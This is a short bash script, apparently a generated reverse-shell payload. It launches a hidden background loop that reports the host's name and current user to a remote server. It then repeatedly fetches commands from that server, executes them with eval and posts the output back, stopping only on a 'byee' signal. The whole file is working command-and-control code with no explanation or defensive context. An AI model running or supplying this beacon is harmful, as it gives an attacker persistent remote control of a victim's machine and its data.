#!/bin/bash
nohup bash -c 's=eth0:8080&&i=f16f33-3ea32f-c396aa&&hname=$(hostname)&&p=http://;curl -s "$p$s/f16f33/$hname/$USER" -H "Authorization: $i" -o /dev/null&&while :; do c=$(curl -s "$p$s/3ea32f" -H "Authorization: $i")&&if [ "$c" != None ]; then r=$(eval "$c" 2>&1)&&echo $r;if [ $r == byee ]; then pkill -P $$; else curl -s $p$s/c396aa -X POST -H "Authorization: $i" -d "$r";echo $$;fi; fi; sleep 0.8; done;' & disown
